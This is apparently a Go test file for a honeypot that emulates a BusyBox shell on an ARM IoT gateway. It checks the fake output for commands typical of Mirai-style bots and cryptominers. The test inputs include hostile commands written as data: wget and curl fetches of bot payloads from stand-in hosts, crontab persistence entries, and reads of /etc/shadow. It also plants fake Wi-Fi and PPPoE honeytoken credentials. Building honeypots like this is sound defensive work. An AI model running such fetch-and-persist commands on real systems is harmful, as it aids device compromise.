package vfs

import (
	"path"
	"strings"
	"testing"
	"time"
)

// Each row = a line sent by the attacker + what must appear on screen.
func TestRun(t *testing.T) {
	tests := []struct {
		line string
		want string
	}{
		{"whoami", "root\n"},
		{"uname -m", "armv7l\n"},
		{"cd /tmp; pwd", "/tmp\n"},
		{"cd /tmp/../etc && pwd", "/etc\n"},
		{"cd /missing || cd /var/run; pwd", "-sh: cd: can't cd to /missing: No such file or directory\n/var/run\n"},
		{"cd /missing 2>/dev/null || cd /var/run; pwd", "/var/run\n"},
		{"cat /etc/passwd | grep admin", "admin:x:0:0:admin:/root:/bin/ash\n"}, // admin has uid 0 (still root)
		{"cat /proc/cpuinfo | grep 'model name'", "model name\t: ARMv7 Processor rev 5 (v7l)\n"},
		{`echo -e '\x6b\x61\x6d\x69'`, "kami\n"},
		{`echo "a; b" && echo c`, "a; b\nc\n"},
		{"echo -n done", "done"},
		{"/bin/busybox ECCHI", "ECCHI: applet not found\n"},
		{"busybox echo hello", "hello\n"},
		{"wget http://evil.example/bot && echo never-printed", "wget: can't connect to remote host: Connection timed out\n"},
		{"ls /var", "log    run    spool  tmp    www\n"},
		{"cd /tmp; touch a; mkdir b; ls", "a  b\n"},
		{"echo kami > /tmp/.x; cat /tmp/.x; rm /tmp/.x; cat /tmp/.x", "kami\ncat: can't open '/tmp/.x': No such file or directory\n"},
		{"echo one > f; echo two >> f; cat f", "one\ntwo\n"},
		{"echo hi > /missing/file", "-sh: can't create /missing/file: nonexistent directory\n"},
		{"cd /tmp; wget http://x/bot -O - > bot; cat bot; ls", "wget: can't connect to remote host: Connection timed out\nbot\n"},
		{"cat /missing > f 2>/dev/null; ls", "f\n"},
		{"cat /tmp", "cat: read error: Is a directory\n"},
		{"./bot", "-sh: ./bot: not found\n"},
		{"cd /tmp; cp /bin/busybox x; ./x && echo started", "started\n"},
		{"ls /etc", "dropbear      hostname      lighttpd      ppp           shadow\n" + // columns as wide as
			"group         hosts         os-release    profile       shells\n" + // the longest name + 2
			"hostapd.conf  issue.net     passwd        resolv.conf\n"},
		{"ps | grep lighttpd", "  349 root      2108 S    /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf\n"}, // port 80 = a running web server
		{"cat /var/run/lighttpd.pid", "349\n"}, // its PID, in the pid-file from its config
		{"ls /var/www", "index.html  login.cgi\n"},
		{"grep document-root /etc/lighttpd/lighttpd.conf", "server.document-root = \"/var/www\"\n"},
		{"cat /var/www/index.html | grep action", "    <form method=\"POST\" action=\"/login.cgi\">\n"},
		{"curl -O http://x/a.sh", "-sh: curl: not found\n"}, // BusyBox has no curl
		{"enable", "-sh: enable: not found\n"},              // Mirai's probe for a vendor CLI
		{"cat /etc/shells", "/bin/ash\n"},
		{"grep wheel /etc/group", "wheel:x:10:root\n"},
		{"uname -a", "Linux gateway 4.14.180 #1 SMP Thu Jun  4 12:00:00 UTC 2020 armv7l GNU/Linux\n"},
		{"cat /proc/version", "Linux version 4.14.180 (builder@buildhost) (gcc version 8.3.0 (Buildroot 2019.05.3)) #1 SMP Thu Jun  4 12:00:00 UTC 2020\n"},
		{"cat /etc/os-release | grep PRETTY", "PRETTY_NAME=\"Buildroot 2019.05.3\"\n"}, // a link to /usr/lib/os-release
		{"cat /bin/echo", elfHeader}, // a link to busybox: Mirai reads the ELF header through it
		{"/usr/bin/wget http://x/bot", "wget: can't connect to remote host: Connection timed out\n"},
		{"cd /bin; ./ls /var", "log    run    spool  tmp    www\n"},
		{"/sbin/init", "init: must be run as PID 1\n"},
		{"cat /var/run/dropbear.pid", "341\n"},
		{"cat /proc/meminfo | grep MemTotal", "MemTotal:         124520 kB\n"},
		{"", ""},
		{";;", ""},
	}

	for _, tt := range tests {
		got, _, _ := NewShell().Run(tt.line)
		if got != tt.want {
			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
		}
	}
}

// Run returns the exit code of the last command that ran, like $? (SSH sends it to the client).
func TestExitCodes(t *testing.T) {
	tests := []struct {
		line string
		want int
	}{
		{"whoami", 0},
		{"nosuchcmd", 127},
		{"curl http://203.0.113.7/x.sh", 127},
		{"cat /missing", 1},
		{"wget http://203.0.113.7/x", 1},
		{"false && echo never", 1}, // echo is skipped, so $? stays 1
		{"nosuchcmd || true", 0},
		{"lighttpd", 0}, // a program in PATH that isn't an applet: "runs" silently
		{"/usr/sbin/dropbear", 0},
		{"cat /etc/hostname | grep nomatch", 1}, // a pipe's code is its last command's
		{"free -h", 1},                          // BusyBox's free has no -h: usage
		{"nproc && free -m && df -h && uptime", 0},
		{"df /nope", 1},
		{"crontab -l", 1}, // no crontab yet
		{"echo '* * * * * x' | crontab - && crontab -l", 0},
		{"", 0},
	}
	for _, tt := range tests {
		if _, code, _ := NewShell().Run(tt.line); code != tt.want {
			t.Errorf("Run(%q): exit code %d, want %d", tt.line, code, tt.want)
		}
	}
}

// exit ends the session: nothing after it runs.
func TestExit(t *testing.T) {
	out, _, exit := NewShell().Run("echo bye; exit; echo never-printed")
	if out != "bye\n" || !exit {
		t.Errorf("got %q, exit=%v", out, exit)
	}
}

// The prompt follows the current directory.
func TestPrompt(t *testing.T) {
	sh := NewShell()
	if p := sh.Prompt(); p != "root@gateway:~# " {
		t.Errorf("prompt at start: %q", p)
	}
	sh.Run("cd /tmp")
	if p := sh.Prompt(); p != "root@gateway:/tmp# " {
		t.Errorf("prompt after cd /tmp: %q", p)
	}
}

// Two attackers must not see each other's files or current directory.
func TestSessionsAreSeparate(t *testing.T) {
	a := NewShell()
	b := NewShell()
	a.Run("cd /tmp; echo secret > x")

	if out, _, _ := b.Run("cat /tmp/x"); out != "cat: can't open '/tmp/x': No such file or directory\n" {
		t.Errorf("b sees a's file: %q", out)
	}
	if out, _, _ := b.Run("pwd"); out != "/root\n" {
		t.Errorf("b has a's directory: %q", out)
	}
}

// fixedClock makes the ls -l dates predictable: "now" is Nov 20 2026 10:30, the boot was 2 days before.
func fixedClock(t *testing.T) {
	oldNow, oldBoot := now, bootTime
	now = func() time.Time { return time.Date(2026, time.November, 20, 10, 30, 0, 0, time.UTC) }
	bootTime = time.Date(2026, time.November, 18, 9, 15, 0, 0, time.UTC)
	t.Cleanup(func() { now, bootTime = oldNow, oldBoot })
}

// ls like BusyBox 1.30: columns, hidden files, several targets and the -l line
// ("%-10s %4d %-8s %-8s %9s" + date + name, the same printf as in BusyBox's ls.c).
func TestLs(t *testing.T) {
	fixedClock(t)
	const nippon = "cd /tmp; echo kami > .nippon; mkdir d; " // a bot's hidden file + a directory
	tests := []struct{ line, want string }{
		{"ls /", "bin   dev   etc   lib   mnt   proc  root  sbin  sys   tmp   usr   var\n"},
		{"ls -1 /var", "log\nrun\nspool\ntmp\nwww\n"},
		{"ls --color=auto /var", "log    run    spool  tmp    www\n"},
		{"ls /nope /etc/hostname", "ls: /nope: No such file or directory\n/etc/hostname\n"},
		{"ls /var/run /etc/hostname", "/etc/hostname\n\n/var/run:\ndropbear.pid  lighttpd.pid\n"},
		{"ls /var/run /var/log", "/var/log:\nmessages\n\n/var/run:\ndropbear.pid  lighttpd.pid\n"},

		// hidden files (.x) only with -a or -A, or when named
		{nippon + "ls", "d\n"},
		{nippon + "ls -a", ".        ..       .nippon  d\n"},
		{nippon + "ls -A", ".nippon  d\n"},
		{nippon + "ls .nippon", ".nippon\n"},

		// -l: firmware files from 2020 (older than 6 months -> year), /tmp /var /dev /proc from boot,
		// the attacker's files from "now"
		{"ls -la", "drwxr-xr-x    2 root     root            40 Jun  4  2020 .\n" +
			"drwxr-xr-x   14 root     root           280 Jun  4  2020 ..\n"},
		{"ls -l /var/run", "-rw-r--r--    1 root     root             4 Nov 18 09:15 dropbear.pid\n" +
			"-rw-r--r--    1 root     root             4 Nov 18 09:15 lighttpd.pid\n"},
		{"ls -l /bin/sh /bin/busybox /dev/null",
			"-rwxr-xr-x    1 root     root        278412 Jun  4  2020 /bin/busybox\n" +
				"lrwxrwxrwx    1 root     root             7 Jun  4  2020 /bin/sh -> busybox\n" +
				"crw-rw-rw-    1 root     root        1,   3 Nov 18 09:15 /dev/null\n"},
		{"ls -l /usr/bin/wget /proc/cpuinfo",
			"-r--r--r--    1 root     root             0 Nov 18 09:15 /proc/cpuinfo\n" +
				"lrwxrwxrwx    1 root     root            17 Jun  4  2020 /usr/bin/wget -> ../../bin/busybox\n"},
		{"ls -ld /tmp /proc",
			"dr-xr-xr-x    2 root     root             0 Nov 18 09:15 /proc\n" +
				"drwxrwxrwt    2 root     root            40 Nov 18 09:15 /tmp\n"},
		{nippon + "ls -la",
			"drwxrwxrwt    3 root     root            80 Nov 18 09:15 .\n" +
				"drwxr-xr-x   14 root     root           280 Jun  4  2020 ..\n" +
				"-rw-r--r--    1 root     root             5 Nov 20 10:30 .nippon\n" +
				"drwxr-xr-x    2 root     root            40 Nov 20 10:30 d\n"},
		{"ls -l /var/www/login.cgi", // a program; /var/www is on the firmware, not in RAM like /var/run
			"-rwxr-xr-x    1 root     root         13764 Jun  4  2020 /var/www/login.cgi\n"},
		{"ls -l /etc/dropbear", // a key file in Dropbear's format, 141 bytes like a real ECDSA P-256 one
			"-rw-------    1 root     root           141 Jun  4  2020 dropbear_ecdsa_host_key\n"},
		{"echo x >> /etc/shadow; ls -l /etc/shadow", // overwriting keeps the mode, the date changes
			"-rw-------    1 root     root           290 Nov 20 10:30 /etc/shadow\n"},
	}
	for _, tt := range tests {
		got, _, _ := NewShell().Run(tt.line)
		if got != tt.want {
			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
		}
	}
}

// Columns go top to bottom, then left to right, each as wide as the longest name + 2 (BusyBox).
func TestColumns(t *testing.T) {
	names := []string{"ash", "busybox", "cat", "chmod", "cp", "echo", "false", "grep", "hostname", "kill",
		"login", "ls", "mkdir", "mv", "ps", "pwd", "rm", "sh", "sleep", "touch", "true", "uname"}
	want := "ash       cp        hostname  mkdir     rm        true\n" +
		"busybox   echo      kill      mv        sh        uname\n" +
		"cat       false     login     ps        sleep\n" +
		"chmod     grep      ls        pwd       touch\n"
	if got := columns(names); got != want {
		t.Errorf("columns:\n%s\nwant:\n%s", got, want)
	}

	long := strings.Repeat("x", 80) // wider than the terminal -> one name per line
	if got := columns([]string{long, "y"}); got != long+"\ny\n" {
		t.Errorf("a name wider than the terminal: %q", got)
	}
}

// Every applet link must work as a command: an "ls /bin" entry that answers "not found" gives us away.
func TestAppletsAreImplemented(t *testing.T) {
	for p, target := range fakeLinks {
		if path.Base(target) != "busybox" {
			continue // the C library links
		}
		if out, code, _ := NewShell().command([]string{p}, ""); code == 127 {
			t.Errorf("%s -> %s is listed but not implemented: %q", p, target, out)
		}
	}
}

// Every path ps shows (programs, the pid file, /bin/login) must exist: an attacker can ls -l it.
func TestPsMatchesFiles(t *testing.T) {
	sh := NewShell()
	for _, line := range strings.Split(fakePS, "\n") {
		fields := strings.Fields(line)
		for _, f := range fields[min(4, len(fields)):] { // the COMMAND column and its arguments
			if _, ok := sh.readFile(f); strings.HasPrefix(f, "/") && !ok {
				t.Errorf("ps shows %s, which does not exist", f)
			}
		}
	}
}

// "busybox" alone: BusyBox 1.30.1's own text, then the applets wrapped like appletlib.c does
// (a new line when col >= 79 - (len + 2); the tab counts as 6).
func TestBusyboxHelp(t *testing.T) {
	out, _, _ := NewShell().Run("busybox")
	if !strings.HasPrefix(out, "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n") {
		t.Errorf("first line: %q", strings.SplitN(out, "\n", 2)[0])
	}
	want := "Currently defined functions:\n" +
		"\tash, cat, chmod, cp, crontab, df, echo, false, free, ftpget, grep,\n" +
		"\thostname, id, init, kill, killall, klogd, login, ls, mkdir, mv, nproc,\n" +
		"\tps, pwd, rm, sh, sleep, syslogd, telnetd, tftp, touch, true, uname,\n" +
		"\tuptime, wget, whoami\n"
	if !strings.HasSuffix(out, want) {
		t.Errorf("applet list:\n%s\nwant:\n%s", out[strings.Index(out, "Currently"):], want)
	}
}

// The web server's files come from /var/www; ".." can't leave it (lighttpd cleans the path too).
func TestWebFile(t *testing.T) {
	tests := []struct {
		path   string
		exists bool
	}{
		{"/", true}, // index-file.names: index.html
		{"/index.html", true},
		{"/login.cgi", true},
		{"/login", false},
		{"/../../etc/passwd", false}, // = /var/www/etc/passwd, not /etc/passwd
		{"/etc/passwd", false},
		{"/var/www/index.html", false}, // a URL path, not a filesystem path
	}
	for _, tt := range tests {
		if _, ok := WebFile(tt.path); ok != tt.exists {
			t.Errorf("WebFile(%q): exists = %v, want %v", tt.path, ok, tt.exists)
		}
	}
	if page, _ := WebFile("/"); page != LoginPage(false) {
		t.Error("/ is not the login page")
	}
}

// What cryptominers check before installing: the output of BusyBox 1.30.1 (its printf formats) with
// Buildroot's config, the numbers from /proc/meminfo, /proc/cpuinfo and /proc/mounts.
func TestMinerCommands(t *testing.T) {
	fixedClock(t) // now Nov 20 10:30:00, boot Nov 18 09:15:00 = up 2 days 1:15
	const crontabUsage = "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\n" +
		"Usage: crontab [-c DIR] [-u USER] [-ler]|[FILE]\n\n" +
		"\t-c\tCrontab directory\n\t-u\tUser\n\t-l\tList crontab\n\t-e\tEdit crontab\n" +
		"\t-r\tDelete crontab\n\tFILE\tReplace crontab by FILE ('-': stdin)\n"
	tests := []struct{ line, want string }{
		// free: total = MemTotal, free = MemFree, shared = Shmem, buff/cache = Buffers + Cached,
		// used = the rest, available = MemAvailable; no swap
		{"free", "              total        used        free      shared  buff/cache   available\n" +
			"Mem:         124520       58608       38412         312       27500       61208\n" +
			"Swap:             0           0           0\n"},
		{"free -m | grep Mem", "Mem:            121          57          37           0          26          59\n"},
		{"free -h", "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\n" +
			"Usage: free [-b/k/m/g]\n\nDisplay the amount of free and used system memory\n"},
		{"nproc", "1\n"}, // one "processor" in /proc/cpuinfo
		{"nproc --all", "1\n"},

		{"uptime", " 10:30:00 up 2 days,  1:15,  load average: 0.08, 0.03, 0.01\n"},
		{"uptime -s", "2026-11-18 09:15:00\n"},
		{"cat /proc/uptime /proc/loadavg", "177300.00 173754.00\n0.08 0.03 0.01 1/11 530\n"}, // 11 processes in ps

		// df: the two tmpfs from /proc/mounts (rootfs, proc and sysfs have no blocks); /tmp gets
		// half the RAM (62260K), /dev its size=512k
		{"df", "Filesystem           1K-blocks      Used Available Use% Mounted on\n" +
			"tmpfs                    62260         0     62260   0% /tmp\n" +
			"tmpfs                      512         0       512   0% /dev\n"},
		{"df -h", "Filesystem                Size      Used Available Use% Mounted on\n" +
			"tmpfs                    60.8M         0     60.8M   0% /tmp\n" +
			"tmpfs                   512.0K         0    512.0K   0% /dev\n"},
		{"cd /tmp; echo kami > .x; df -h .", "Filesystem                Size      Used Available Use% Mounted on\n" +
			"tmpfs                    60.8M      4.0K     60.8M   0% /tmp\n"}, // a file takes a whole 4K page
		{"echo kami > /tmp/x; df -m | grep /tmp", "tmpfs                       61         0        61   0% /tmp\n"},
		{"cp /etc/passwd /dev/shm/p; df /dev/shm", "Filesystem           1K-blocks      Used Available Use% Mounted on\n" +
			"tmpfs                      512         4       508   1% /dev\n"}, // 1 page of 128: (100 + 64) / 128
		{"df -T | grep Filesystem", "Filesystem           Type       1K-blocks      Used Available Use% Mounted on\n"},
		{"df /proc", "Filesystem           1K-blocks      Used Available Use% Mounted on\n" +
			"proc                         0         0         0   0% /proc\n"},
		{"df /etc", "Filesystem           1K-blocks      Used Available Use% Mounted on\n"}, // on rootfs: left out
		{"df /nope", "Filesystem           1K-blocks      Used Available Use% Mounted on\n" +
			"df: /nope: can't find mount point\n"},

		// crontab: how miners come back after a reboot
		{"crontab -l", "crontab: can't open 'root': No such file or directory\n"},
		{`(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/x") | crontab -; crontab -l`, "*/5 * * * * /tmp/x\n"},
		{"echo '* * * * * a' | crontab -; crontab -r; crontab -l", "crontab: can't open 'root': No such file or directory\n"},
		{"echo '@reboot /tmp/x' > /tmp/c; crontab /tmp/c; ls /var/spool/cron/crontabs; cat /var/spool/cron/crontabs/cron.update",
			"cron.update  root\nroot\n"},
		{"crontab /tmp/nope", "crontab: can't open '/tmp/nope': No such file or directory\n"},
		{"crontab -u admin -l", "crontab: can't open 'admin': No such file or directory\n"},
		{"crontab -u bob -l", "crontab: unknown user bob\n"},
		{"crontab -e; crontab -l && echo empty", "crontab: can't execute 'vi': No such file or directory\nempty\n"},
		{"crontab", crontabUsage},
		{"crontab -l -r", crontabUsage},

		// a subshell's commands are one group: | gets all their output; "$(" is still part of a word
		{"(echo a; echo b) | grep b", "b\n"},
		{"(echo a; echo b) | grep a", "a\n"},
		{"(echo a; echo b)", "a\nb\n"},
		{"echo x; (echo a) | grep a; echo y | grep y", "x\na\ny\n"},
		{"echo $(id)", "$(id)\n"},
		{"echo '* * * * * one' | crontab -; (crontab -l; echo '* * * * * two') | crontab -; crontab -l",
			"* * * * * one\n* * * * * two\n"}, // a bot that comes twice keeps its first job too
	}
	for _, tt := range tests {
		got, _, _ := NewShell().Run(tt.line)
		if got != tt.want {
			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
		}
	}
}

// The honeytokens are where an attacker looks for them, and the programs that use those files run.
func TestHoneytokens(t *testing.T) {
	fixedClock(t)
	tests := []struct{ line, want string }{
		{"grep wpa_passphrase /etc/hostapd.conf", "wpa_passphrase=w7Kq2mVx9pLz\n"},
		{"cat /etc/ppp/chap-secrets | grep 2210417553", "\"2210417553\"\t*\t\"Rp4tHx92kQ\"\t*\n"},
		{"grep user /etc/ppp/peers/isp", "user \"2210417553\"\n"}, // the same account in both pppd files
		{"ps | grep hostapd", "  362 root      1840 S    /usr/sbin/hostapd -B /etc/hostapd.conf\n"},
		{"ps | grep pppd", "  377 root      1216 S    /usr/sbin/pppd call isp\n"},
		{"ls -l /etc/ppp", "-rw-------    1 root     root           108 Jun  4  2020 chap-secrets\n" +
			"drwxr-xr-x    2 root     root            60 Jun  4  2020 peers\n"},
		{"ls /usr/lib/pppd/2.4.7", "rp-pppoe.so\n"}, // the plugin named in /etc/ppp/peers/isp
	}
	for _, tt := range tests {
		got, _, _ := NewShell().Run(tt.line)
		if got != tt.want {
			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
		}
	}

	// a honeytoken found in a password list would no longer prove that someone read the file
	shadow := fakeFiles["/etc/shadow"] + fakeFiles["/etc/passwd"]
	for _, token := range []string{wifiPassphrase, pppoeUser, pppoePassword} {
		if strings.Contains(shadow, token) {
			t.Errorf("honeytoken %q is in /etc/passwd or /etc/shadow", token)
		}
	}
}

// /proc/meminfo in the kernel's format: "Name:" padded to 16, the value in 8 columns, " kB".
func TestMeminfo(t *testing.T) {
	out, _, _ := NewShell().Run("cat /proc/meminfo")
	lines := strings.Split(strings.TrimSuffix(out, "\n"), "\n")
	if len(lines) < 30 || lines[0] != "MemTotal:         124520 kB" {
		t.Fatalf("%d lines, the first %q", len(lines), lines[0])
	}
	for _, l := range lines {
		if len(l) != 27 || !strings.HasSuffix(l, " kB") {
			t.Errorf("not in the kernel's format: %q", l)
		}
	}
}
